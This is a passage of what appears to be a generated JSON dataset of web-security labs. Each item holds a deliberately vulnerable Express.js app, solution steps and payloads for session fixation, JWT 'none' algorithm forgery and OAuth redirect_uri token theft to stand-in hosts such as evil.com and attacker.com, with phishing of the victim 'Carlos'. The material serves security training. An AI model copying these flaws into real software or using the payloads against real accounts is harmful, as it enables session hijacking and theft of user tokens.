    "srcCode": "const express = require('express');\nconst WebSocket = require('ws');\nconst app = express();\nconst server = app.listen(3000);\nconst wss = new WebSocket.Server({ server });\nconst sessions = {};\nwss.on('connection', (ws, req) => {\n  const sessionId = new URL(req.url, 'http://dummy.com').searchParams.get('session') || req.headers['sec-websocket-protocol'];\n  if (sessions[sessionId]) {\n    ws.user = sessions[sessionId];\n    ws.send(`Welcome ${ws.user}`);\n  } else {\n    ws.close(1008, 'Invalid session');\n  }\n});\napp.get('/login', (req, res) => {\n  const sessionId = req.query.session || Math.random().toString(36).substr(2);\n  sessions[sessionId] = req.query.user || 'guest';\n  res.json({ sessionId });\n});\napp.get('/ws-url', (req, res) => {\n  res.send(`ws://localhost:3000/?session=${req.query.session}`);\n});",
    "payloads": [
      "ws://victim.com/?session=fixed_session_id",
      "new WebSocket('ws://victim.com/ws', ['session=injected_session']);",
      "Sec-WebSocket-Protocol: session=highjacked_session"
    ]
  },
  {
    "Lab scenario": "JWT tampering vulnerability in Authorization Header",
    "Lab Description": "The application uses JWT tokens for API authorization, but the server fails to validate token signatures properly. The token's algorithm is set to 'none', and the backend fails to enforce cryptographic verification. To solve: forge a valid JWT to access the admin resource and retrieve sensitive user data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to capture a valid JWT from the Authorization header after logging in with normal credentials.",
      "Verify the JWT token structure and decode its payload using jwt.io or Burp Suite Decoder.",
      "Modify the payload to {\"role\":\"admin\"} and change the header algorithm to 'none'.",
      "Craft the JWT manually or using a Python script without a signature and send the forged Authorization: Bearer <token> header in a GET /admin/users request.",
      "Check the server response for access to the admin dashboard and verify Carlos\u00e2\u20ac\u2122s user data is present."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecure'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'admin123') { const token = jwt.sign({ username: 'admin', role: 'admin' }, secret); res.json({ token }); } else if (username === 'carlos') { const token = jwt.sign({ username: 'carlos', role: 'user' }, secret); res.json({ token }); } else { res.status(401).send('Unauthorized'); } }); app.get('/admin/users', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.role === 'admin') { res.send('Admin access granted. User: carlos, email: carlos@domain.com'); } else { res.status(403).send('Forbidden'); } } catch (err) { res.status(401).send('Invalid token'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
      "JWT with header: {\"alg\":\"none\"}, payload: {\"role\":\"admin\"} and empty signature"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login flow",
    "Lab Description": "The web app reuses pre-login session IDs after authentication, without regenerating them. An attacker can pre-set a known session ID and then trick a victim into logging in using that same ID. To solve: hijack Carlos's session by setting a fixed session ID before login and access his account page post-authentication.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Using Burp Suite, intercept a GET /login request and set a fixed session cookie (e.g., sessionid=attacker1234).",
      "Send the link with the preset cookie to the victim (Carlos).",
      "After Carlos logs in, reuse the same session ID (attacker1234) in your browser to gain access.",
      "Browse to /my-account with the hijacked session.",
      "Verify Carlos\u00e2\u20ac\u2122s account page is loaded with valid data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'secret123' }]; const sessions = {}; app.get('/login', (req, res) => { if (!req.cookies.sessionid) { res.cookie('sessionid', Math.random().toString(36).substring(2)); } res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sessionid] = username; res.redirect('/my-account'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user === 'carlos') { res.send('Carlos account data'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
    "payloads": [
      "Cookie: sessionid=attacker1234",
      "Trick victim to login with crafted sessionid via link",
      "Reuse sessionid=attacker1234 after victim login"
    ]
  },
  {
    "Lab scenario": "OAuth redirect_uri misconfiguration in OAuth callback endpoint",
    "Lab Description": "The OAuth implementation lacks strict validation of the redirect_uri parameter, allowing open redirect-based session hijacking. The application trusts any domain containing the correct base string. To solve: craft a malicious authorization URL that captures a valid OAuth token for Carlos\u00e2\u20ac\u2122s session.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite or Postman to initiate an OAuth login request to /oauth/authorize with a manipulated redirect_uri containing attacker-controlled domain (e.g., https://evil.com?redirect=https://vulnerable.app).",
      "Observe that the app redirects and appends the access_token as a query parameter to the redirect_uri.",
      "Simulate phishing: send this crafted link to the victim and get them to authorize it.",
      "Access the intercepted token and replay it in Authorization: Bearer <token> to access /my-account.",
      "Verify successful access to Carlos\u00e2\u20ac\u2122s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const url = require('url'); const app = express(); const tokens = { 'carlos': 'token123' }; app.get('/oauth/authorize', (req, res) => { const { redirect_uri, user } = req.query; if (!user || !redirect_uri.includes('vulnerable.app')) { return res.status(400).send('Invalid request'); } const token = tokens[user]; res.redirect(`${redirect_uri}?access_token=${token}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token123') { res.send('Carlos account info'); } else { res.status(401).send('Invalid token'); } }); app.listen(5000);",
    "payloads": [
      "https://vulnerable.app/oauth/authorize?user=carlos&redirect_uri=https://evil.com?redirect=https://vulnerable.app",
      "Authorization: Bearer token123",
      "https://evil.com?access_token=token123"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass via 'none' algorithm in Authorization header",
    "Lab Description": "The backend uses JWTs for session management and relies on the 'alg' field of the JWT to determine verification logic. The server is misconfigured to accept unsigned tokens by trusting the 'none' algorithm. The application grants access to authenticated endpoints based solely on the decoded payload. To solve: craft a tampered token to access Carlos's account by bypassing signature verification.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the JWT token issued after logging in as your own user.",
      "2. Decode the JWT using jwt.io or jwt_tool and observe the 'alg' header value is 'HS256'.",
      "3. Modify the 'alg' field to 'none' and change the payload's 'sub' or 'username' field to 'carlos'.",
      "4. Remove the signature segment and reconstruct the token as a two-part JWT.",
      "5. Send the modified token in the Authorization header and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecretkey'; app.use((req, res, next) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); req.user = decoded; next(); } catch (err) { return res.status(403).send('Invalid token'); } }); app.get('/my-account', (req, res) => { if (req.user.username === 'carlos') res.send('Welcome to Carlos\u00e2\u20ac\u2122s account!'); else res.send('Not authorized'); }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
      "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "Session fixation in cookie-based authentication on login route",
    "Lab Description": "This application uses a fixed `sessionID` value that is issued prior to authentication and is not regenerated upon login. The session ID is accepted from the client and trusted server-side, leading to session fixation. To solve: pre-fixate a session ID and trick the server into accepting it as Carlos\u00e2\u20ac\u2122s session after login.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP to analyze login flow and observe session cookie issued on visiting /login.",
      "2. Save the initial session ID value and confirm it's preserved after login.",
      "3. Use a second browser/session to initiate login as Carlos with the previously fixated session ID.",
      "4. Log in using Carlos\u00e2\u20ac\u2122s credentials in the manipulated session to bind it.",
      "5. Return to the first browser with the fixated session ID and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 'secretpass' }; app.get('/login', (req, res) => { const sid = req.cookies.sessionID || Math.random().toString(36).substr(2); res.cookie('sessionID', sid); res.send('<form method=post>Username:<input name=username> Password:<input name=password><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.sessionID] = username; res.send('Logged in'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionID]; if (user === 'carlos') res.send('Access granted to Carlos\u00e2\u20ac\u2122s account'); else res.send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "sessionID=abc123; login as carlos",
      "sessionID=fixed_session_token; reuse after login",
      "sessionID=carlos_prebind; match after post-login"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in redirect_uri trust chain",
    "Lab Description": "This application integrates a third-party OAuth provider. However, it fails to validate the redirect_uri parameter correctly, allowing an attacker to supply an arbitrary value. This allows leaking the access token to an attacker-controlled domain. To solve: exploit the misconfigured OAuth flow and extract the access_token for Carlos\u00e2\u20ac\u2122s account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Postman to explore the OAuth flow by initiating login through the app's /oauth/login endpoint.",
      "2. Intercept the OAuth redirect using Burp and identify the redirect_uri parameter.",
      "3. Modify the redirect_uri to an attacker-controlled domain like https://evil.com/callback and resend the request.",
      "4. Log in as Carlos on the OAuth provider and observe the token redirect to your controlled endpoint.",
      "5. Capture the access token and replay it against /my-account using Bearer authentication."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/oauth/login', (req, res) => { const redirect = req.query.redirect_uri; const authURL = `https://oauth.example.com/authorize?client_id=app123&redirect_uri=${redirect}&response_type=token`; res.redirect(authURL); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'VALID_TOKEN_FOR_CARLOS') res.send('Carlos account access granted'); else res.status(401).send('Invalid token'); }); app.listen(4000);",
    "payloads": [
      "redirect_uri=https://evil.com/callback",
      "redirect_uri=https://attacker.site/capture?token=",
      "Authorization: Bearer VALID_TOKEN_FOR_CARLOS"
    ]
  },
  {
    "Lab scenario": "JWT tampering via algorithm confusion in Authorization header",
    "Lab Description": "This lab's API uses JWTs for authentication, but fails to enforce algorithm verification properly. The application accepts the 'alg' field in the token header without validating it against a whitelist. An attacker can modify the token's algorithm to 'none' and forge authentication tokens. The application uses these tokens for REST API access to protected resources. To solve: forge a valid admin token using algorithm tampering to access the /admin endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Postman to capture a valid Authorization: Bearer <JWT> header after login.",
      "2. Decode the JWT using jwt.io or a local script and observe the 'alg' field and payload structure.",
      "3. Modify the JWT header to {\"alg\":\"none\"} and change the payload to {\"username\":\"admin\",\"role\":\"admin\"}.",
      "4. Remove the signature part of the JWT and reassemble the token with only header.payload.",
      "5. Send a GET request to /admin with the modified JWT in the Authorization header.",
      "6. Observe admin panel access to verify successful tampering."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', role: 'admin' }, { username: 'user1', role: 'user' }]; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, 'secret'); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role === 'admin') return res.send('Admin access granted'); } res.status(403).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
      "{\"alg\":\"none\"}.{\"username\":\"admin\",\"role\":\"admin\"}."
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow hijack via open redirect in redirect_uri",
    "Lab Description": "This lab simulates a web application using OAuth 2.0 for authentication through a third-party provider. The application improperly validates redirect URIs, allowing arbitrary open redirect manipulation. An attacker can poison the redirect_uri parameter to capture a victim's access token. To solve: craft a malicious OAuth URL to leak Carlos's token and use it to access the protected resource.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the OAuth login request and identify the redirect_uri parameter.",
      "2. Replace the redirect_uri with a URL you control (e.g., https://attacker.com/oauth/callback).",
      "3. Create a crafted URL like: https://auth-server.com/oauth/authorize?response_type=token&client_id=xyz&redirect_uri=https://attacker.com/oauth/callback.",
      "4. Use social engineering or script injection to trick Carlos into visiting the link.",
      "5. When Carlos authenticates, extract the token from the fragment of the redirected URL (in access_token=...).",
      "6. Replay the token in a request to /api/user-info using Postman to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const users = { 'carlos': { access_token: 'abc123xyz', name: 'Carlos' } }; app.get('/oauth/callback', (req, res) => { const token = req.query.token; if (!token) return res.status(400).send('Missing token'); res.send('Token received: ' + token); }); app.get('/api/user-info', (req, res) => { const token = req.headers['authorization']; if (!token) return res.status(401).send('No token'); const accessToken = token.replace('Bearer ', ''); if (accessToken === 'abc123xyz') return res.send('Welcome Carlos!'); res.status(403).send('Invalid token'); }); app.listen(4000);",
    "payloads": [
      "https://auth-server.com/oauth/authorize?response_type=token&client_id=xyz&redirect_uri=https://attacker.com/oauth/callback",
      "Bearer abc123xyz"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login flow via preset session cookie",
    "Lab Description": "This lab's login process reuses the session ID that was initially assigned before authentication. The application fails to regenerate a session upon successful login, allowing session fixation. An attacker can pre-assign a session ID to a victim and hijack the session after login. To solve: fixate Carlos\u00e2\u20ac\u2122s session ID, then reuse it to access his /dashboard page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a GET /login request and observe the Set-Cookie: session=<value> response.",
      "2. Store this session cookie and craft a phishing page that loads the application with this cookie preset (e.g., document.cookie='session=attacker-session'; location='/login').",
      "3. Trick Carlos into logging in while using the attacker-controlled session ID.",
      "4. Wait until the victim logs in; the server will bind the session to Carlos's account.",
      "5. Replay the same session cookie to access the /dashboard endpoint.",
      "6. Confirm successful hijack by accessing Carlos's dashboard."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); let sessions = {}; const users = { carlos: 'hunter2' }; app.get('/login', (req, res) => { if (!req.cookies.session) { const sid = Math.random().toString(36).slice(2); sessions[sid] = { username: null }; res.cookie('session', sid); } res.send('<form method=\"POST\">Login</form>'); }); app.post('/login', (req, res) => { const sid = req.cookies.session; const { username, password } = req.body; if (users[username] === password) { sessions[sid].username = username; res.send('Login successful'); } else { res.status(401).send('Invalid login'); } }); app.get('/dashboard', (req, res) => { const sid = req.cookies.session; if (sessions[sid] && sessions[sid].username === 'carlos') res.send('Welcome to Carlos's dashboard'); else res.status(403).send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "document.cookie='session=fixedsession123';location='/login';",
      "Cookie: session=fixedsession123"
    ]
  },
  {
    "Lab scenario": "JWT signature bypass using 'none' algorithm in authentication middleware",
    "Lab Description": "The application uses JWTs for session management but does not validate the signature algorithm securely. The token is decoded without verifying the signature if the 'alg' field is set to 'none'. The application blindly trusts unsigned JWTs. To solve: Forge a valid admin session by tampering with the JWT payload.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Capture a valid JWT after logging in as a normal user using Burp Suite.",
      "2. Decode the JWT using jwt.io or a Python script and observe the 'alg' field in the header.",
      "3. Modify the JWT header by changing the algorithm to 'none'. Edit the payload to {\"role\": \"admin\"}.",
      "4. Remove the signature part (third segment) completely.",
      "5. Replace the original JWT with the tampered token in the Authorization header using Burp Repeater and send a request to /admin/dashboard to verify access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); app.post('/login', (req, res) => { const { username, password } = req.body; if (username && password) { const token = jwt.sign({ user: username, role: 'user' }, 'insecure-secret', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Login failed'); } }); app.get('/admin/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token); if (decoded && decoded.role === 'admin') { res.send('Welcome, admin!'); } else { res.status(403).send('Forbidden'); } }); app.listen(4000, () => console.log('JWT None Alg Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.",
      "Authorization: Bearer <forged_token>"
    ]
  },
  {
    "Lab scenario": "Session fixation in login flow using pre-authenticated session IDs",
    "Lab Description": "The application does not regenerate session tokens upon successful login, allowing an attacker to pre-assign a session to the victim. The attacker forces the victim to authenticate using a known session ID. To solve: Fix a session ID for Carlos, get him to log in, and reuse that session to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to send a GET /login request and observe that a Set-Cookie: session=<value> header is received before authentication.",
      "2. Note the session ID and craft a phishing link with this ID (e.g., https://vulnerable-site.com/login?session=fixed1234).",
      "3. Assume Carlos logs in via this link, attaching the fixed session ID to his authenticated session.",
      "4. After Carlos logs in, reuse the same session ID in your browser or via Burp with the session=fixed1234 cookie.",
      "5. Visit /my-account to confirm Carlos's session is hijacked and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const sessions = {}; const users = { carlos: 'supersecure' }; app.get('/login', (req, res) => { const sid = req.query.session || Math.random().toString(36).substring(2); res.cookie('session', sid); res.send('<form method=\"POST\" action=\"/login\">Username: <input name=\"username\"><br>Password: <input name=\"password\"><br><input type=\"submit\"></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; if (users[username] === password) { sessions[sid] = username; res.redirect('/my-account'); } else { res.status(403).send('Invalid'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; if (sessions[sid] === 'carlos') { res.send('Carlos account details'); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "https://vulnerable.com/login?session=fixed1234",
      "Cookie: session=fixed1234"
    ]
  },
  {
    "Lab scenario": "OAuth implicit grant token leakage via referrer",
    "Lab Description": "The application uses OAuth2 Implicit Grant flow with the access token exposed in the URL fragment. Due to improper redirect URI configuration, the token leaks through referrer headers when redirected to third-party content. To solve: Capture Carlos's access token from a leaked referrer and use it to access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use a malicious redirect URI that points to your controlled site, e.g., https://attacker.com#access_token=<token>.",
      "2. Trick Carlos into authenticating with the OAuth provider using this redirect URI.",
      "3. On redirection, observe the access token fragment in your server logs or browser developer tools.",
      "4. Use Postman to send a GET request to https://vulnerable-site.com/api/user-profile with the Authorization: Bearer <leaked_token> header.",
      "5. Confirm that the token grants access to Carlos\u00e2\u20ac\u2122s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const users = { carlos: { profile: 'Carlos user profile', token: 'abc123token' } }; app.get('/oauth/callback', (req, res) => { const token = req.query.token; if (token) { res.redirect(`https://cdn.tracker.com/image.png#access_token=${token}`); } else { res.send('OAuth failed'); } }); app.get('/api/user-profile', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader?.split(' ')[1]; if (token === 'abc123token') { res.send(users.carlos.profile); } else { res.status(403).send('Access Denied'); } }); app.listen(4000, () => console.log('OAuth Token Leak Lab running'));",
    "payloads": [
      "https://auth-server.com/oauth/authorize?response_type=token&client_id=abc&redirect_uri=https://attacker.com",
      "Authorization: Bearer abc123token"
    ]
  },
  {
    "Lab scenario": "JWT tampering Authentication bypass in API endpoint",
    "Lab Description": "The backend API uses JWTs to authenticate users, but fails to properly verify the signing algorithm. The application trusts the 'alg' value in the token header and skips verification if it's set to 'none'. To solve: Access the admin endpoint using a forged token that impersonates the user 'carlos'.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a valid JWT by logging in as a regular user.",
      "2. Decode the token using jwt.io or a similar tool. Note the 'alg' and payload contents.",
      "3. Change the header 'alg' value to 'none' and set the payload sub/username to 'carlos'.",
      "4. Remove the signature portion of the token and reassemble it as a two-part JWT.",
      "5. Replay the modified token in a request to the /admin endpoint using Postman or Burp Repeater and verify successful access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); const secret = 'supersecretkey'; app.use((req, res, next) => { const token = req.headers.authorization?.split(' ')[1]; if (token) { try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { req.user = decoded.payload; } else { req.user = jwt.verify(token, secret); } next(); } catch (e) { res.status(401).send('Invalid token'); } } else { res.status(401).send('No token'); } }); app.get('/admin', (req, res) => { if (req.user && req.user.username === 'carlos') { res.send('Welcome, admin carlos'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MiLCJyb2xlIjoiYWRtaW4ifQ."
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login flow",
    "Lab Description": "The session management mechanism reuses a client-supplied session ID even after successful authentication. The application does not regenerate session tokens upon login. To solve: Inject a known session ID and get the victim (Carlos) to log in using that ID, then hijack the session and access their account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to issue a GET request to /login with a custom Set-Cookie: session=attacker123.",
      "2. Send a crafted phishing link with this session ID to Carlos via the /contact endpoint or similar feature.",
      "3. After Carlos logs in, revisit the app using the session=attacker123 cookie in your browser or Burp Repeater.",
      "4. Access the /my-account endpoint and observe that it now shows Carlos's account.",
      "5. Confirm the session takeover by modifying Carlos's profile data or capturing internal data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const sessions = {}; const users = { carlos: 'hunter2' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const sid = req.cookies.session || req.query.session || 'guest'; sessions[sid] = username; res.cookie('session', sid); res.send('Login successful'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user === 'carlos') { res.send('Account page of carlos'); } else { res.send('Not authorized'); } }); app.listen(4000);",
    "payloads": [
      "Cookie: session=attacker123",
      "https://example.com/login?session=attacker123"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in redirect URI",
    "Lab Description": "The OAuth implementation fails to validate the redirect URI strictly, allowing open redirection and leakage of the authorization code. An attacker can inject a malicious URI with their own domain. To solve: Intercept the OAuth code for Carlos and exchange it for an access token to access the /api/userinfo endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP or Burp to inspect the OAuth authorization request flow.",
      "2. Observe that the redirect_uri parameter is vulnerable to open redirection.",
      "3. Register your own endpoint or use an HTTP listener (e.g., webhook.site) to capture requests.",
      "4. Send Carlos a phishing link to initiate the OAuth login with redirect_uri pointing to your domain.",
      "5. When Carlos clicks the link and authenticates, capture the authorization code and exchange it for a token using curl/Postman.",
      "6. Use the token to call /api/userinfo and confirm Carlos's identity."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const url = require('url'); const tokens = {}; const authCodes = {}; app.get('/authorize', (req, res) => { const { response_type, client_id, redirect_uri, state } = req.query; if (client_id === 'trusted-app') { const code = 'authcode123'; authCodes[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}&state=${state}`); } else { res.status(400).send('Invalid client'); } }); app.get('/token', (req, res) => { const { code } = req.query; if (authCodes[code]) { const token = 'token-' + authCodes[code]; tokens[token] = authCodes[code]; res.json({ access_token: token }); } else { res.status(400).send('Invalid code'); } }); app.get('/api/userinfo', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = tokens[token]; if (user === 'carlos') { res.json({ username: 'carlos', role: 'user' }); } else { res.status(403).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "https://auth.example.com/authorize?client_id=trusted-app&redirect_uri=https://webhook.site/your_id&response_type=code&state=xyz",
      "GET /token?code=authcode123",
      "Authorization: Bearer token-carlos"
    ]
  },
  {
    "Lab scenario": "JWT 'none' algorithm authentication bypass in login API",
    "Lab Description": "This lab uses JSON Web Tokens (JWTs) to manage user sessions. The backend fails to validate the `alg` field properly, accepting unsigned tokens when `alg` is set to `none`. The application returns a JWT after login and uses it for accessing protected endpoints. To solve: tamper with the JWT to impersonate Carlos and access his account without valid credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Log in using your own credentials and intercept the POST /login response in Burp Suite to extract your JWT token.",
      "2. Decode the JWT using jwt.io or Burp Decoder. Note the payload and header structure.",
      "3. Modify the JWT header to use \"alg\":\"none\" and change the payload to {\"username\":\"carlos\"}.",
      "4. Remove the JWT signature entirely and base64-encode the new header and payload.",
      "5. Replace your token with the tampered one in the Authorization: Bearer header and send a request to /my-account.",
      "6. If successful, you'll see Carlos's account information, completing the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'carlos123' }, { username: 'guest', password: 'guest123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Unauthorized'); const token = jwt.sign({ username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (!decoded) return res.status(400).send('Invalid token'); const username = decoded.payload.username; res.send(`Account info for ${username}`); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running on port 4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "{\"alg\":\"none\"}.{\"username\":\"carlos\"}.",
      "Authorization: Bearer [header.payload.]"
    ]
  },
  {
    "Lab scenario": "Session fixation in login flow via GET parameter",
    "Lab Description": "This lab implements session management using a custom session ID passed as a URL parameter and stored as a cookie. However, the session is not regenerated after login, making it vulnerable to session fixation. To solve: set a session ID for Carlos before login and hijack his session after he authenticates.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to initiate a session with a fixed session ID, e.g., GET /login?session=attack123 and observe that it is set as a cookie.",
      "2. Send Carlos a crafted phishing link containing your session ID, like /login?session=attack123.",
      "3. After Carlos logs in, the server reuses the same session ID (no regeneration).",
      "4. Reuse the session ID attack123 in your browser and access /my-account. You'll be logged in as Carlos.",
      "5. Confirm the account switch and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { carlos: 'secret123', alice: 'password' }; const sessions = {}; app.get('/login', (req, res) => { const sid = req.query.session || Math.random().toString(36).substring(2); res.cookie('session', sid); res.send('Login page with session set'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const sid = req.cookies.session; sessions[sid] = username; res.send('Logged in'); } else { res.status(403).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (!user) return res.status(403).send('Unauthorized'); res.send(`Welcome ${user}`); }); app.listen(4001, () => console.log('Session Fixation Lab running on port 4001'));",
    "payloads": [
      "/login?session=attack123",
      "Set-Cookie: session=attack123",
      "POST /login with session cookie set to attack123"
    ]
  },
  {
    "Lab scenario": "OAuth token reuse due to lack of client binding",
    "Lab Description": "This lab involves an OAuth flow where the access token is not bound to a specific client application. A malicious actor can reuse a token issued to one client on another. The application does not validate the `aud` or `client_id`. To solve: reuse an access token issued to your app to impersonate Carlos on the victim app.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Authenticate using your own credentials via the OAuth flow in App A and intercept the access token.",
      "2. Note that the token payload contains only the username and expiry, with no client-specific claims.",
      "3. Copy the token and use Postman or Burp to access App B's /my-account endpoint, adding the Authorization: Bearer [token] header.",
